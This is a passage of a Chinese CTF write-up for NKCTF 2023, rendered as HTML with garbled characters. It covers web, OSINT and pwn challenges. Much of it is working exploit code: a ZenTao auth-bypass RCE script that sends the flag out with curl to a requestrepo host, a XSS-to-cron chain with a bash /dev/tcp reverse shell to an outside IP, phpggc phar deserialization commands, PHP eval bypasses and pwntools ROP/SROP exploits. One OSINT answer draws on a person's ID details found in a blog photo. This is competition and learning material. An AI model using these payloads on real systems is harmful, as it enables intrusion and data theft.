class="hljs-string">&quot;#[$][_0-9a-z]+[\s]*[(][\s\S]*[)][\s]*[;]#iU&quot;</span>, <span class="hljs-string">&quot; <span class="hljs-subst">&#123;$content&#125;</span>&quot;</span>) == <span class="hljs-literal">TRUE</span>) &#123;<br>        <span class="hljs-variable">$content</span> = <span class="hljs-title function_ invoke__">dede_htmlspecialchars</span>(<span class="hljs-variable">$content</span>);<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;DedeCMSæç¤ºï¼šå½“å‰é¡µé¢ä¸­å­˜åœ¨æ¶æ„ä»£ç ï¼&lt;pre&gt;<span class="hljs-subst">&#123;$content&#125;</span>&lt;/pre&gt;&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;#[@][$][_0-9a-z]+[\s]*[(][\s\S]*[)]#iU&quot;</span>, <span class="hljs-string">&quot; <span class="hljs-subst">&#123;$content&#125;</span>&quot;</span>) == <span class="hljs-literal">TRUE</span>) &#123;<br>        <span class="hljs-variable">$content</span> = <span class="hljs-title function_ invoke__">dede_htmlspecialchars</span>(<span class="hljs-variable">$content</span>);<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;DedeCMSæç¤ºï¼šå½“å‰é¡µé¢ä¸­å­˜åœ¨æ¶æ„ä»£ç ï¼&lt;pre&gt;<span class="hljs-subst">&#123;$content&#125;</span>&lt;/pre&gt;&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;#[`][\s\S]*[`]#i&quot;</span>, <span class="hljs-string">&quot; <span class="hljs-subst">&#123;$content&#125;</span>&quot;</span>) == <span class="hljs-literal">TRUE</span>) &#123;<br>        <span class="hljs-variable">$content</span> = <span class="hljs-title function_ invoke__">dede_htmlspecialchars</span>(<span class="hljs-variable">$content</span>);<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;DedeCMSæç¤ºï¼šå½“å‰é¡µé¢ä¸­å­˜åœ¨æ¶æ„ä»£ç ï¼&lt;pre&gt;<span class="hljs-subst">&#123;$content&#125;</span>&lt;/pre&gt;&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>ä½¿ç”¨<code>scandir</code>åˆ—ç›®å½•</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-string">&#x27;/&#x27;</span>));<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>ä½¿ç”¨<code>include</code>è¯»æ–‡ä»¶</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;/f1Aggg&#x27;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p><img src="/img/wp/2023/2023nkctf-34.png"></p>
<h2 id="webpagetest"><a href="#webpagetest" class="headerlink" title="webpagetest"></a>webpagetest</h2><p>webpagetestååºåˆ—åŒ–</p>
<p><a href="https://xz.aliyun.com/t/11798">AVD-2022-1474319</a></p>
<p>å€ŸåŠ©<code>phpggc</code>ç”Ÿæˆæ‰§è¡Œ<code>cat /flag</code>å‘½ä»¤çš„<code>phar</code>æ–‡ä»¶å¹¶å‘é€</p>
<figure class="highlight text"><table><tr><td class="code"><pre><code class="hljs text">./phpggc Monolog/RCE2 system &#x27;cat /flag&#x27; -p phar -o testinfo.ini<br><br>URLENC_PAYLOAD=$(cat /root/phpggc/testinfo.ini | xxd -p | tr -d &quot;\n&quot; | sed &quot;s#..#%&amp;#g&quot;)<br><br>curl -sSkig &#x27;http://c7885b16-57d7-4179-8865-f1f0bb4c73af.node2.yuzhian.com.cn/runtest.php&#x27; -d &#x27;rkey=gadget&#x27; -d &quot;ini=$URLENC_PAYLOAD&quot; -o -<br><br>curl -sSkig &#x27;http://c7885b16-57d7-4179-8865-f1f0bb4c73af.node2.yuzhian.com.cn/runtest.php&#x27; -d &#x27;rkey=phar:///var/www/html/results/gadget./testinfo.ini/foo&#x27; -d &quot;ini=$URLENC_PAYLOAD&quot; -o -<br></code></pre></td></tr></table></figure>

<p><img src="/img/wp/2023/2023nkctf-35.png"></p>
<h2 id="easy-pms"><a href="#easy-pms" class="headerlink" title="easy_pms"></a>easy_pms</h2><p>å³é”®æŸ¥çœ‹ç½‘é¡µæºä»£ç å¾—åˆ°ç‰ˆæœ¬ä¸º<code>18.0.beta1</code></p>
<p>githubæœåˆ°<a href="https://github.com/webraybtl/zentaopms_poc/blob/main/poc_bypass_rce.py">poc</a></p>
<p>ä¿®æ”¹ä¸€ä¸‹ï¼ŒåŠ ä¸ªå›æ˜¾ï¼Œç”¨<code>curl</code>å¤–å¸¦åˆ°ç¬¬ä¸‰æ–¹å¹³å°<br><code>/flag</code>å¤ªé•¿ç”¨<code>grep+base64</code>ç­›é€‰</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: UTF-8 -*-</span><br><span class="hljs-comment"># !/usr/bin/python</span><br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">æƒé™ç»•è¿‡+RCE POC ä¼ªé™æ€ä¼ å‚ç‰ˆ</span><br><span class="hljs-string">ç¦…é“ç³»ç»Ÿ å½±å“ç‰ˆæœ¬ å®‰å…¨ç‰ˆæœ¬</span><br><span class="hljs-string">å¼€æºç‰ˆ 17.4ä»¥ä¸‹çš„æœªçŸ¥ç‰ˆæœ¬&lt;=version&lt;=18.0.beta1 18.0.beta2</span><br><span class="hljs-string">æ——èˆ°ç‰ˆ 3.4ä»¥ä¸‹çš„æœªçŸ¥ç‰ˆæœ¬&lt;=version&lt;=4.0.beta1 4.0.beta2</span><br><span class="hljs-string">ä¼ä¸šç‰ˆ 7.4ä»¥ä¸‹çš„æœªçŸ¥ç‰ˆæœ¬&lt;=version&lt;=8.0.beta1 8.0.beta2</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-keyword">import</span> requests<br><br>proxies = &#123;<br>    <span class="hljs-comment">#&quot;http&quot;: &quot;127.0.0.1:8080&quot;,</span><br>    <span class="hljs-comment">#&quot;https&quot;: &quot;127.0.0.1:8080&quot;,</span><br>&#125;<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">check</span>(<span class="hljs-params">url</span>):<br>    <span class="hljs-comment"># url=&quot;http://10.211.55.3:8008&quot;</span><br>    url1 = url+<span class="hljs-string">&#x27;/misc-captcha-user.html&#x27;</span><br>    <span class="hljs-comment"># url1 = url+&#x27;/index.php?m=misc&amp;f=captcha&amp;sessionVar=user&#x27;#éä¼ªé™æ€ç‰ˆæœ¬æŒ‰ç…§æ­¤æ ¼å¼ä¼ å‚</span><br>    <span class="hljs-comment"># url2 = url+&#x27;/index.php?m=block&amp;f=printBlock&amp;id=1&amp;module=my&#x27;#å¯åˆ¤æ–­éªŒè¯ç»•è¿‡çš„é“¾æ¥</span><br>    url3 = url + <span class="hljs-string">&#x27;repo-create.html&#x27;</span><br>    url4 = url + <span class="hljs-string">&#x27;repo-edit-10000-10000.html&#x27;</span><br>    headers=&#123;<br>        <span class="hljs-string">&quot;User-Agent&quot;</span>:<span class="hljs-string">&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36&quot;</span>,<br>        <span class="hljs-string">&quot;Accept-Language&quot;</span>:<span class="hljs-string">&quot;zh-CN,zh;q=0.9&quot;</span>,<br>        <span class="hljs-string">&quot;Cookie&quot;</span>:<span class="hljs-string">&quot;zentaosid=u6vl6rc62jiqof4g5jtle6pft2; lang=zh-cn; device=desktop; theme=default&quot;</span>,<br>    &#125;<br><br>    headers2 = &#123;<br>        <span class="hljs-string">&quot;User-Agent&quot;</span>: <span class="hljs-string">&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36&quot;</span>,<br>        <span class="hljs-string">&quot;Accept-Language&quot;</span>: <span class="hljs-string">&quot;zh-CN,zh;q=0.9&quot;</span>,<br>        <span class="hljs-string">&quot;Cookie&quot;</span>: <span class="hljs-string">&quot;zentaosid=u6vl6rc62jiqof4g5jtle6pft2; lang=zh-cn; device=desktop; theme=default&quot;</span>,<br>        <span class="hljs-string">&quot;Content-Type&quot;</span>:<span class="hljs-string">&quot;application/x-www-form-urlencoded&quot;</span>,<br>        <span class="hljs-string">&quot;X-Requested-With&quot;</span>:<span class="hljs-string">&quot;XMLHttpRequest&quot;</span>,<br>        <span class="hljs-string">&quot;Referer&quot;</span>:url+<span class="hljs-string">&quot;/repo-edit-1-0.html&quot;</span><br>    &#125;<br><br>    data1 = <span class="hljs-string">&#x27;product%5B%5D=1&amp;SCM=Gitlab&amp;name=66666&amp;path=&amp;encoding=utf-8&amp;client=&amp;account=&amp;password=&amp;encrypt=base64&amp;desc=&amp;uid=&#x27;</span><br>    data2 = <span class="hljs-string">&#x27;SCM=Subversion&amp;client=`curl http://tmar9l37.requestrepo.com/?1=\\`cat /flag|grep NKCTF|base64\\``&#x27;</span><br>    s=requests.session()<br>    <span class="hljs-keyword">try</span>:<br>        req1 = s.get(url1,proxies=proxies,timeout=<span class="hljs-number">5</span>,verify=<span class="hljs-literal">False</span>,headers=headers)<br>        req3 = s.post(url3,data=data1,proxies=proxies,timeout=<span class="hljs-number">5</span>,verify=<span class="hljs-literal">False</span>,headers=headers2)<br>        req4 = s.post(url4,data=data2,proxies=proxies,timeout=<span class="hljs-number">5</span>,verify=<span class="hljs-literal">False</span>,headers=headers2)<br>        <span class="hljs-built_in">print</span>(req4.text)<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(e)<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    <span class="hljs-built_in">print</span>(check(<span class="hljs-string">&quot;http://9dab2a42-f651-4ef6-86a7-a356af0c7437.node2.yuzhian.com.cn/&quot;</span>))<br></code></pre></td></tr></table></figure>

<p><img src="/img/wp/2023/2023nkctf-36.png"></p>
<h2 id="xiaopi"><a href="#xiaopi" class="headerlink" title="xiaopi"></a>xiaopi</h2><p>å°çš®å­˜å‚¨å‹XSS-&gt;rce</p>
<p><a href="https://blog.csdn.net/weixin_46944519/article/details/128954060">å‚è€ƒæ–‡ç« </a></p>
<p>è¯·æ±‚å¤´åŠ ä¸Š<code>X-Requested-With: XMLHttpRequest</code>å°±èƒ½è®¿é—®ç™»å½•æ¡†</p>
<p>vpsä¸Šæ”¾å®šæ—¶ä»»åŠ¡ï¼Œåå¼¹shell</p>
<figure class="highlight js"><table><tr><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">poc</span>(<span class="hljs-params"></span>)&#123;<br>  $.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/service/app/tasks.php?type=task_list&#x27;</span>,&#123;&#125;,<span class="hljs-keyword">function</span>(<span class="hljs-params">data</span>)&#123;<br>    <span class="hljs-keyword">var</span> id=data.<span class="hljs-property">data</span>[<span class="hljs-number">0</span>].<span class="hljs-property">ID</span>;<br>    $.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/service/app/tasks.php?type=exec_task&#x27;</span>,&#123;<br>      <span class="hljs-attr">tid</span>:id<br>    &#125;,<span class="hljs-keyword">function</span>(<span class="hljs-params">res2</span>)&#123;<br>        $.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/service/app/log.php?type=clearlog&#x27;</span>,&#123;<br><br>        &#125;,<span class="hljs-keyword">function</span>(<span class="hljs-params">res3</span>)&#123;&#125;,<span class="hljs-string">&quot;json&quot;</span>);<br><br><br>    &#125;,<span class="hljs-string">&quot;json&quot;</span>);<br>  &#125;,<span class="hljs-string">&quot;json&quot;</span>);<br>&#125;<br><span class="hljs-keyword">function</span> <span class="hljs-title function_">save</span>(<span class="hljs-params"></span>)&#123;<br>  <span class="hljs-keyword">var</span> data=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>();<br>  data.<span class="hljs-property">task_id</span>=<span class="hljs-string">&quot;&quot;</span>;<br>  data.<span class="hljs-property">title</span>=<span class="hljs-string">&quot;test&quot;</span>;<br>  data.<span class="hljs-property">exec_cycle</span>=<span class="hljs-string">&quot;1&quot;</span>;<br>  data.<span class="hljs-property">week</span>=<span class="hljs-string">&quot;1&quot;</span>;<br>  data.<span class="hljs-property">day</span>=<span class="hljs-string">&quot;3&quot;</span>;<br>  data.<span class="hljs-property">hour</span>=<span class="hljs-string">&quot;16&quot;</span>;<br>  data.<span class="hljs-property">minute</span> = <span class="hljs-string">&quot;35&quot;</span>;<br>  data.<span class="hljs-property">shell</span>=<span class="hljs-string">&#x27;bash -i &gt;&amp; /dev/tcp/20.2.129.79/8888 0&gt;&amp;1&#x27;</span>;<br>  $.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/service/app/tasks.php?type=save_shell&#x27;</span>,data,<span class="hljs-keyword">function</span>(<span class="hljs-params">res</span>)&#123;<br>    <span class="hljs-title function_">poc</span>();<br>  &#125;,<span class="hljs-string">&#x27;json&#x27;</span>);<br>&#125;<br><span class="hljs-title function_">save</span>();<br></code></pre></td></tr></table></figure>

<p><code>python</code>å¼€å¯ä¸€ä¸ª<code>http</code>æœåŠ¡</p>
<p><code>python3 -m http.server 7777</code></p>
<p><img src="/img/wp/2023/2023nkctf-37.png"></p>
<p>åœ¨ç™»å½•å¤„ç”¨æˆ·åæ¡†ä¸­æ’å…¥<code>&lt;script src=http://20.2.129.79:7777/1.js&gt;&lt;/script&gt;</code></p>
<p><img src="/img/wp/2023/2023nkctf-38.png"></p>
<p>æ’å…¥å®Œåç­‰å¾…ç®¡ç†å‘˜botç™»å½•ï¼Œè§¦å‘è®¡åˆ’ä»»åŠ¡ï¼Œåå¼¹shell</p>
<p><img src="/img/wp/2023/2023nkctf-39.png"></p>
<h2 id="hard-php"><a href="#hard-php" class="headerlink" title="hard_php"></a>hard_php</h2><p><strong>èµ›åå¤ç°</strong></p>
<p>ctfshowçš„é¢˜ç›®åŠ ä¸Šä¸€äº›å‡½æ•°ç¦ç”¨</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">// not only ++</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;NKCTF&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$NK</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;NKCTF&#x27;</span>];<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">is_string</span>(<span class="hljs-variable">$NK</span>)) &#123;<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/[a-zA-Z0-9@#%^&amp;*:&#123;&#125;\-&lt;\?&gt;\&quot;|`~\\\\]/&quot;</span>,<span class="hljs-variable">$NK</span>) &amp;&amp; <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$NK</span>) &lt; <span class="hljs-number">105</span>)&#123;<br>            <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$NK</span>);<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">echo</span>(<span class="hljs-string">&quot;hacker!!!&quot;</span>);<br>        &#125;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-title function_ invoke__">phpinfo</span>();<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>


<p><code>NKCTF=$_=(ï¼/ï¼)._;$_=$_[&#39;&#39;==&#39;$&#39;];$_++;$__=$_++;$__=$_++.$__;$_++;$_++;$_=&#39;_&#39;.$__.($_++).$_;$$_[__]($$_[_]);&amp;__=shell_exec&amp;_=echo `cat /flag`&gt;/var/www/html/3.txt</code></p>
<p>urlç¼–ç åä¸Šä¼ </p>
<h1 id="Social-Engineering"><a href="#Social-Engineering" class="headerlink" title="Social Engineering"></a>Social Engineering</h1><h2 id="Bridge"><a href="#Bridge" class="headerlink" title="Bridge"></a>Bridge</h2><p>ç™¾åº¦è¯†å›¾å¾—åˆ°å…³é”®ä¿¡æ¯<code>æµ·å£</code>ï¼Œè¿›æ–°é—»å¾—åˆ°<code>ä¸–çºªå¤§æ¡¥</code>ï¼Œåœ¨<code>ä¸–çºªå¤§æ¡¥</code>æ—è¾¹æœ‰ä¸€ä¸ª<code>ä¸–çºªå…¬å›­</code></p>
<p><img src="/img/wp/2023/2023nkctf-40.png"></p>
<p><code>NKCTF&#123;æµ·å—çœæµ·å£å¸‚é¾™ååŒºä¸–çºªå…¬å›­&#125;</code></p>
<h2 id="ä¸¤ä¸ªäººçš„å¤œæ™š"><a href="#ä¸¤ä¸ªäººçš„å¤œæ™š" class="headerlink" title="ä¸¤ä¸ªäººçš„å¤œæ™š"></a>ä¸¤ä¸ªäººçš„å¤œæ™š</h2><p>æ ¹æ®å›¾ä¸Šçš„<code>NCCæ–°åŸå¸‚ä¸­å¿ƒ</code>å»ç™¾åº¦åœ°å€</p>
<p><code>NKCTF&#123;å¤©æ´¥å¸‚è¥¿é’åŒºä¸­åŒ—é•‡ä¸‡å‰è·¯3å·NCCæ–°åŸå¸‚ä¸­å¿ƒ&#125;</code></p>
<h2 id="ç‹‚é£™"><a href="#ç‹‚é£™" class="headerlink" title="ç‹‚é£™"></a>ç‹‚é£™</h2><p>æŠ–éŸ³æœç‹‚é£™å–æ™¯åœ°å¾—åˆ°<code>è²å¹³è·¯</code></p>
<p><img src="/img/wp/2023/2023nkctf-41.png"></p>
<p><code>NKCTF&#123;å¹¿ä¸œçœæ±Ÿé—¨å¸‚è“¬æ±ŸåŒºè²å¹³è·¯&#125;</code></p>
<h2 id="real-social-engineering"><a href="#real-social-engineering" class="headerlink" title="real-social-engineering"></a>real-social-engineering</h2><p>githubæœä»–idï¼Œæ‰¾åˆ°åšå®¢åœ°å€ï¼š<a href="https://tacooo0o.github.io/">https://tacooo0o.github.io/</a></p>
<p>åœ¨<code>2021å¹´ç»ˆæ€»ç»“</code>è¿™ç¯‡æ–‡ç« ä¸­æ‰¾åˆ°é©¾é©¶è¯å›¾ç‰‡ï¼ŒåŒ…å«äº†èº«ä»½è¯ä¿¡æ¯</p>
<p><code>NKCTF&#123;6107**********4710&#125;</code></p>
<h2 id="Ferris-Wheel"><a href="#Ferris-Wheel" class="headerlink" title="Ferris_Wheel"></a>Ferris_Wheel</h2><p>ç™¾åº¦è¯†å›¾å¾—åˆ°<code>æ°¸å·</code>ï¼Œ<code>æ‘©å¤©è½®</code>ï¼Œ<code>æ¸è¥¿</code>ç­‰å…³é”®è¯</p>
<p><img src="/img/wp/2023/2023nkctf-42.png"></p>
<p>ç™¾åº¦åœ°å›¾æ‰¾åˆ°æ¸è¥¿ä¹‹çœ¼ï¼Œç»„åˆçˆ†ç ´ä¸‹åœ°å</p>
<p><code>NKCTF&#123;é‡åº†å¸‚æ°¸å·åŒºå…´é¾™æ¹–CBDæ°¸å·é‡Œå¥¥ç‰¹è±æ–¯æ¸è¥¿ä¹‹çœ¼æ‘©å¤©è½®&#125;</code></p>
<h2 id="æ—…ç¨‹çš„å¼€å§‹"><a href="#æ—…ç¨‹çš„å¼€å§‹" class="headerlink" title="æ—…ç¨‹çš„å¼€å§‹"></a>æ—…ç¨‹çš„å¼€å§‹</h2><p>ç™¾åº¦åœ°å›¾æœ<code>ä¸­é“é…’åº—</code>ï¼Œå¾—åˆ°<code>è´µé˜³ç«è½¦ç«™</code>ï¼Œå®æ™¯ä¸€ç‚¹ä¸€ç‚¹ä¸å›¾ç‰‡å¯¹æ¯”</p>
<p><img src="/img/wp/2023/2023nkctf-43.png"></p>
<p><code>NKCTF&#123;è´µå·çœè´µé˜³å¸‚å—æ˜åŒºéµä¹‰è·¯1å·&#125;</code></p>
<h2 id="The-other-Bridge"><a href="#The-other-Bridge" class="headerlink" title="The other Bridge"></a>The other Bridge</h2><p>ç™¾åº¦è¯†å›¾ï¼Œå¾—åˆ°<code>æˆ´å®¶å··å´–å£æ­¥é“</code></p>
<p><img src="/img/wp/2023/2023nkctf-44.png"></p>
<p>æ ¹æ®æç¤ºåŠ ä¸ª<code>ç•”</code></p>
<p><code>NKCTF&#123;é‡åº†å¸‚æ±ŸåŒ—åŒºå˜‰é™µæ±Ÿç•”æˆ´å®¶å··å´–å£æ­¥é“&#125;</code></p>
<h2 id="decompile"><a href="#decompile" class="headerlink" title="decompile"></a>decompile</h2><p>æ­¥éª¤ä¸ä¸Šé¢çš„<code>decompile_revenge</code>ä¸€æ ·</p>
<p><code>NKCTF&#123;N0w_you_kn0w_d3compl1te_bytecode&#125;</code></p>
<h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><h2 id="ezshellcode"><a href="#ezshellcode" class="headerlink" title="ezshellcode"></a>ezshellcode</h2><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>e=ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>context.binary=e<br><span class="hljs-comment">#p=process(&#x27;./pwn&#x27;)</span><br>p=remote(<span class="hljs-string">&quot;node.yuzhian.com.cn:32220&quot;</span>)<br>shell=asm(shellcraft.sh()).rjust(<span class="hljs-number">0x100</span>,<span class="hljs-string">b&#x27;\x90&#x27;</span>)<br>p.sendafter(<span class="hljs-string">b&#x27;min!&#x27;</span>,shell)<br>p.interactive()<br></code></pre></td></tr></table></figure>

<h2 id="a-story-of-a-pwner"><a href="#a-story-of-a-pwner" class="headerlink" title="a_story_of_a_pwner"></a>a_story_of_a_pwner</h2><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#p=process(&#x27;./pwn&#x27;)</span><br>p=remote(<span class="hljs-string">&#x27;node.yuzhian.com.cn:36024&#x27;</span>)<br>libc=ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br>e=ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>context.binary=e<br><br>p.sendlineafter(<span class="hljs-string">&#x27;&gt; \n&#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br>p.readuntil(<span class="hljs-string">&#x27;see this. &#x27;</span>)<br><br>d=<span class="hljs-built_in">int</span>(p.readline().decode().strip(),<span class="hljs-number">16</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(d))<br><br>libc.address=d-libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libc.address))<br><br>rdi=libc.address+<span class="hljs-number">0x0019764d</span><br>bin_sh=<span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&#x27;/bin/sh&#x27;</span>))<br>system=libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br><br>p.sendlineafter(<span class="hljs-string">&#x27;&gt; \n&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>p.sendafter(<span class="hljs-string">&#x27;comment?&#x27;</span>,p64(bin_sh))<br><br>p.sendlineafter(<span class="hljs-string">&#x27;&gt; \n&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>p.sendafter(<span class="hljs-string">&#x27;corment?&#x27;</span>,p64(rdi))<br><br>p.sendlineafter(<span class="hljs-string">&#x27;&gt; \n&#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>p.sendafter(<span class="hljs-string">&#x27;corMenT?&#x27;</span>,p64(system))<br><br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0xa</span>+p64(<span class="hljs-number">0x405098</span>)+p64(<span class="hljs-number">0x401502</span>)<br>p.sendlineafter(<span class="hljs-string">&#x27;&gt; \n&#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br>p.send(payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>


<h2 id="ez-stack"><a href="#ez-stack" class="headerlink" title="ez_stack"></a>ez_stack</h2><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>e=ELF(<span class="hljs-string">&#x27;./ez_stack&#x27;</span>)<br>context.binary=e<br>ax_f=<span class="hljs-number">0x401146</span><br>syscall=<span class="hljs-number">0x40114e</span><br>bss=e.bss(<span class="hljs-number">0x400</span>)<br><br><span class="hljs-comment">#p=process(&#x27;./ez_stack&#x27;)</span><br>p=remote(<span class="hljs-string">&#x27;node2.yuzhian.com.cn&#x27;</span>,<span class="hljs-string">&#x27;39605&#x27;</span>)<br><br>sig=SigreturnFrame()<br>sig.rax=<span class="hljs-number">0</span><br>sig.rip=syscall<br>sig.rdi=<span class="hljs-number">0</span><br>sig.rsi=bss<br>sig.rdx=<span class="hljs-number">0x200</span><br>sig.rsp=bss+<span class="hljs-number">8</span><br><br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>+<span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">8</span>+p64(ax_f)+p64(syscall)+flat(sig)<br><br>p.sendafter(<span class="hljs-string">&#x27;NKCTF!\n&#x27;</span>,payload)<br><br>sig1=SigreturnFrame()<br>sig1.rax=<span class="hljs-number">59</span><br>sig1.rdi=bss<br>sig1.rsi=<span class="hljs-number">0</span><br>sig1.rdx=<span class="hljs-number">0</span><br>sig1.rsp=bss+<span class="hljs-number">0x200</span><br>sig1.rip=syscall<br><br>payload1=<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>+p64(ax_f)+p64(syscall)+flat(sig1)<br>p.send(payload1)<br><br><br>p.interactive()<br></code></pre></td></tr></table></figure>


<h2 id="baby-rop"><a href="#baby-rop" class="headerlink" title="baby_rop"></a>baby_rop</h2><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>debug=<span class="hljs-number">0</span><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    <span class="hljs-keyword">if</span> debug==<span class="hljs-number">1</span>:<br>        p=process(<span class="hljs-string">&quot;./nkctf_message_boards&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        p=remote(<span class="hljs-string">&#x27;node2.yuzhian.com.cn:31457&#x27;</span>)<br>    <span class="hljs-keyword">try</span>:<br><br>        e=ELF(<span class="hljs-string">&quot;nkctf_message_boards&quot;</span>)<br>        func=<span class="hljs-string">&#x27;puts&#x27;</span><br>        func_got=e.got[func]<br>        puts=e.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>        rdi=<span class="hljs-number">0x00401413</span><br>        leave=<span class="hljs-number">0x40138a</span><br>        bss=e.bss(<span class="hljs-number">0x200</span>)<br>        read=<span class="hljs-number">0x401351</span><br>        main=e.sym[<span class="hljs-string">&#x27;main&#x27;</span>]<br>        ret=<span class="hljs-number">0x00401434</span><br>        <span class="hljs-comment">#gdb.attach(p,&#x27;bp 0x401318\nbp 0x40138a&#x27;)</span><br>        p.sendlineafter(<span class="hljs-string">&#x27;name: &#x27;</span>,<span class="hljs-string">b&#x27;%41$p&#x27;</span>)<br>        p.readuntil(<span class="hljs-string">&#x27;Hello, &#x27;</span>)<br>        canary=<span class="hljs-built_in">int</span>(p.readuntil(<span class="hljs-string">&#x27;What&#x27;</span>,drop=<span class="hljs-number">1</span>),<span class="hljs-number">16</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(canary))<br>        n=<span class="hljs-number">0x30</span><br>        pad=<span class="hljs-string">b&#x27;a&#x27;</span>*n<br>        payload=pad+p64(ret)*<span class="hljs-number">13</span>+p64(rdi)+p64(func_got)+p64(puts)+p64(main)<br>        payload=payload.ljust(<span class="hljs-number">0xf8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>        payload+=p64(canary)<br>        p.sendafter(<span class="hljs-string">&#x27;NKCTF: &#x27;</span>,payload)<br>        p.readuntil(<span class="hljs-string">&#x27;carefully.\n&#x27;</span>)<br>        d=u64(p.readuntil(<span class="hljs-string">&#x27;\n&#x27;</span>,drop=<span class="hljs-number">1</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>        <span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(d))<br>        <span class="hljs-keyword">if</span> debug==<span class="hljs-number">1</span>:<br>            libc=ELF(<span class="hljs-string">&quot;/lib/x86_64-linux-gnu/libc-2.33.so&quot;</span>)<br>            libc.address=d-libc.sym[func]<br>            system=libc.sym[<span 